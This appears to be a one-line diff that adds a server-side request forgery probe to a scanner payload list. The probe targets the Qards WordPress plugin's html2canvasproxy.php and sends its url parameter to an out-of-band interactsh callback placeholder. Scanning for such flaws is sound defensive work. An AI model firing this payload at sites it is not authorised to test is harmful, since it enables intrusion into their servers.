@@ -1,0 +1,1 @@
+/wp-content/plugins/qards/html2canvasproxy.php?url=https://{{interactsh-url}}
